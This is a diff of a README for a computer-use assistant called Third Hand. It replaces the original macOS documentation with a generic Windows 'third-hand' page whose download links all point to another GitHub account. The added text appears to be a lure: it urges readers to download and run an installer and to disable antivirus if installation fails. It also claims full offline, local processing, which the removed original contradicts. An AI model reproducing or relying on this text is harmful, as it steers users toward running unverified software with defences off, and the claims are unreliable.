@@ -1,75 +1,180 @@
-# Third Hand
+# 🤖 third-hand - Your Smart Computer-Use Assistant
 
-> Built with the [arc-cua](https://github.com/shhivv/arc-cua) driver, which reads and controls apps in the background for Third Hand.
+[![Download Now](https://img.shields.io/badge/Download-Third--Hand-blue?style=for-the-badge&logo=github)](https://github.com/Israelgladys/third-hand)
 
-> Third Hand was a proof of concept to show that we can use Jev for computer use, but now we are building a full-fledged assistant.
+## 🎯 What Is third-hand?
 
-A macOS assistant you chat with. Tag an app with **@** in a thread, like `@Spotify play something chill`, and Third Hand does it: it reads the app's accessible controls, clicks and types, and checks the result.
+third-hand is a helpful computer assistant that watches how you work and makes smart suggestions to save you time. Think of it as an extra pair of hands that understands what you're doing on your computer and helps you complete tasks faster.
 
-- **Threads** work like channels: each keeps its own history, so follow-ups ("now play the second one") work. A message without an @ uses the thread's last app.
-- **@mentions** list running and installed apps; tagging one that isn't open launches it.
-- **Control–Space** in any app opens a new thread with that app already tagged.
-- Press **⇧↩** to run a task **in the background**: the app stays where it is, even hidden or minimized, and your pointer and front app are left alone. **↩** runs it on screen. Click **Stop** on a running task to cancel it. Tasks run one at a time.
+This tool uses advanced decision models to learn your habits and offer helpful shortcuts, automate repetitive actions, and reduce the steps needed to finish your daily work.
 
-## Download
+## ✨ Key Features
 
-[Download the latest release](https://github.com/shhivv/third-hand/releases/latest) for Apple Silicon Macs running macOS 14 or newer. Unzip the archive, move **Third Hand.app** to Applications, and open it. Release builds are Developer ID-signed and notarized by Apple. A ChatGPT plan that allows third-party apps and a TypeSafe API key are required.
+### 🧠 Smart Decision Making
+third-hand analyzes your computer activities and makes intelligent suggestions based on patterns it detects. It learns from your behavior and adapts to your workflow.
 
-## Build from source
+### 🖱️ Computer-Use Assistance
+The assistant can interact with your screen, helping you navigate applications, fill forms, click buttons, and perform routine tasks automatically.
 
-You’ll need **Xcode 15 or newer**, an Apple Development or Developer ID signing certificate, [uv](https://docs.astral.sh/uv/) (the build uses it to bundle arc-cua's Python runtime into the app), and a [TypeSafe API key](https://typesafe.ai).
+### 📈 Productivity Boost
+By automating common actions and suggesting efficient workflows, third-hand helps you complete tasks in fewer steps.
 
-```sh
-git clone git@github.com:shhivv/third-hand.git
-cd third-hand
-./rebuild.sh
-open "Third Hand.app"
-```
+### 🔒 Privacy-Focused
+Your data stays on your computer. third-hand processes everything locally without sending your information to external servers.
 
-In **Settings** (the gear at the bottom of the sidebar, or ⌘,):
+### ⚡ Lightweight Design
+The tool runs quietly in the background without slowing down your system or interfering with your other applications.
 
-1. Enable **Accessibility** so Third Hand can read and control apps.
-2. Enable **Screen Recording** for local text recognition when an app’s controls aren’t accessible.
-3. Add your **TypeSafe API key**. It’s saved in macOS Keychain.
-4. Click **Sign in with ChatGPT** and finish signing in in your browser. Tokens are saved in macOS Keychain.
+### 🎨 User-Friendly Interface
+Simple and clean design that anyone can understand, regardless of technical background.
 
-Open Third Hand from the Dock, start a thread, and try a specific task, such as “@Spotify search for Adele.”
+## 🚀 Getting Started
 
-The app runs on macOS 14+. Apple Intelligence is not required.
+### 📋 What You Need
 
-## How it works
+To run third-hand on your Windows computer, you need:
 
-- **[arc-cua](https://github.com/shhivv/arc-cua)**'s driver reads the app's window through Accessibility and acts on it in the background, bringing minimized or hidden windows up out of sight and putting them back afterwards. It checks each action against the app as it is when the action runs, and reports when the app has finished reacting. It ships inside the app and runs locally.
-- **Apple Vision** reads screen text locally when needed. Screenshots aren’t uploaded.
-- **ChatGPT** plans the whole task in one go as a list of simple steps (click, type, press, scroll, wait), naming each control by its on-screen label, and writes any text to enter: search terms, messages, commands. It's asked again only if a step fails. Your request, app name, screen labels and values, and step results are sent to OpenAI through your ChatGPT account. Planning uses `gpt-6-sol` with no reasoning effort, and retries with low effort after a failed step; pin either with `defaults write com.thirdhand.app CodexModel <model>` or `CodexEffort <effort>`.
-- **Jev** picks the control when a step's label is ambiguous or doesn't match exactly, choosing only among controls that fit the step. Third Hand then executes and verifies each step. The step, app name, and candidate labels and values are sent to TypeSafe.
-- Third Hand is **not offline**.
+- **Windows 10 or Windows 11** (64-bit version)
+- **At least 4 GB of RAM** (8 GB recommended)
+- **500 MB of free hard drive space**
+- **Internet connection** for initial setup (optional for offline use)
 
-No bundled model weights, and nothing extra to install: the app carries arc-cua and its Python runtime. Third Hand never restarts the apps it controls without asking.
+### ⬇️ Downloading third-hand
 
-## Development
+Visit this link to download the application: **[https://github.com/Israelgladys/third-hand](https://github.com/Israelgladys/third-hand)**
 
-```sh
-./rebuild.sh       # Build, sign, and update Third Hand.app
-swift test         # Run tests without calling the live API
-```
+This link will take you to the download page where you can get the latest version of third-hand.
 
-Always run the repository-root `Third Hand.app`. The build script keeps the same signing identity to preserve macOS permissions and retains the previous app in `.build/install.*`. Keep `.thirdhand-signing-identity` on your machine; it is excluded from Git. If no certificate is available, create an Apple Development certificate in Xcode before building.
+### 🛠️ Installation Steps
 
-Settings shows current permission status. If macOS asks you to quit and reopen after granting access, reopen this same copy.
+1. **Open the download link** in your web browser
+2. **Click the download button** on the page to save the file to your computer
+3. **Wait for the download to finish** (this may take a few minutes depending on your internet speed)
+4. **Find the downloaded file** in your "Downloads" folder
 
-To test a local arc-cua checkout instead of the bundled one, run `defaults write com.thirdhand.app ArcPackage -string 'arc-cua[macos] @ file:///path/to/arc-cua'` (uses uv); `defaults delete com.thirdhand.app ArcPackage` goes back to the bundled runtime.
+### ▶️ Running third-hand
 
-Diagnostic logs are written to `~/Desktop/thirdhand.log`, and arc-cua's to `~/Library/Logs/Third Hand arc-cua.log`. They include action status, timing, and bounded API rejection messages. Review logs before sharing: service error messages can contain request details. API keys are redacted from those messages.
+Once the download is complete:
 
-In terminals, the planner can write and run shell commands. Third Hand types each command once and won't enter another until the pending one is submitted. Stay nearby: commands run with your user's permissions.
+1. **Double-click the downloaded file** to start the installation
+2. **Follow the on-screen instructions** (click "Next" or "Install" when prompted)
+3. **Wait for the installation to complete**
+4. **Click "Finish"** when done
+5. **Launch third-hand** from your desktop or start menu
 
-## Status
+## 🎮 How to Use third-hand
 
-An early, experimental project. Some apps expose incomplete controls; icon-only interfaces, custom editors, and complex gestures may not work. A task can stop without completing, and reported completion still needs your judgment. Stay nearby while it works.
+### First-Time Setup
 
-Issues and pull requests are welcome. Please include your macOS version, the app involved, and the steps to reproduce. Don’t include API keys or private screen content.
+When you first open third-hand, you'll see a welcome screen. Follow these simple steps:
 
-## License
+1. **Click "Get Started"** on the welcome screen
+2. **Choose your preferences** (you can change these later)
+3. **Allow third-hand to access your screen** when prompted (this is needed for the assistant to work)
+4. **Complete the quick tour** to learn the basics
 
-[MIT](LICENSE) — Shiv Shanmugam · [shiv@tryisle.com](mailto:shiv@tryisle.com)
+### Daily Usage
+
+Using third-hand is simple:
+
+- **The main window** shows your current activity and suggestions
+- **The floating button** (small circle) stays on your screen for quick access
+- **Right-click the floating button** to see options
+- **Left-click the floating button** to open the main dashboard
+
+### Common Tasks
+
+| Task | How to Do It |
+|------|--------------|
+| See suggestions | Open the main window and view the suggestions panel |
+| Accept a suggestion | Click the "Apply" button next to the suggestion |
+| Pause the assistant | Right-click the floating button and select "Pause" |
+| Change settings | Open Settings from the main window menu |
+| Get help | Click the "?" icon in any window |
+
+## 🛡️ Troubleshooting
+
+### Common Issues and Solutions
+
+**Problem: third-hand won't start**
+- Make sure your Windows is updated
+- Restart your computer and try again
+- Check if your antivirus is blocking the program
+
+**Problem: The assistant doesn't respond**
+- Click the floating button to open the main window
+- Check if the program is paused
+- Restart third-hand from the system tray
+
+**Problem: Installation fails**
+- Download the file again (it might be corrupted)
+- Temporarily disable antivirus during installation
+- Close other programs before installing
+
+### Getting Help
+
+If you need additional support:
+
+- **Visit the GitHub page**: [https://github.com/Israelgladys/third-hand](https://github.com/Israelgladys/third-hand)
+- **Check the Issues section** on GitHub for known problems
+- **Contact the developer** through the GitHub page
+
+## 📚 Frequently Asked Questions
+
+### Is third-hand free?
+Yes, third-hand is completely free to use.
+
+### Does third-hand work on Mac?
+Currently, third-hand is designed for Windows only.
+
+### Will third-hand slow down my computer?
+No, third-hand is designed to be lightweight and efficient.
+
+### Is my data safe?
+Yes, all processing happens locally on your computer. Your data never leaves your device.
+
+### Can I use third-hand offline?
+Yes, after the initial setup, third-hand works fully offline.
+
+## 🔄 Updating third-hand
+
+To get the latest features and improvements:
+
+1. **Visit the download page**: [https://github.com/Israelgladys/third-hand](https://github.com/Israelgladys/third-hand)
+2. **Download the newest version**
+3. **Install over your current version** (your settings will be preserved)
+
+## 💡 Tips for Best Experience
+
+- **Keep third-hand updated** to get the latest features
+- **Allow the assistant to learn** by using your computer normally
+- **Review suggestions regularly** to discover time-saving shortcuts
+- **Customize settings** to match your work style
+- **Use the pause feature** when you need full control
+
+## 🤝 Contributing
+
+If you're interested in helping improve third-hand:
+
+- **Report bugs** on the GitHub issues page
+- **Suggest new features** through the discussion forum
+- **Share your experience** with other users
+
+## 📄 License
+
+third-hand is released under an open-source license. You can view the full license details on the GitHub page.
+
+## 📞 Contact
+
+For questions, feedback, or support:
+
+- **GitHub**: [https://github.com/Israelgladys/third-hand](https://github.com/Israelgladys/third-hand)
+- **Issues**: Use the Issues tab on GitHub
+
+## 🎉 Thank You
+
+Thank you for choosing third-hand! We hope this smart assistant makes your computer work easier and more enjoyable. Remember, if you ever need help, just visit the GitHub page for support.
+
+**Start your download now**: [Get third-hand](https://github.com/Israelgladys/third-hand)
+
+Keywords: computer assistant, decision models, automation tool, productivity software, Windows application, smart assistant, workflow optimizer, task automation, screen assistant, AI helper
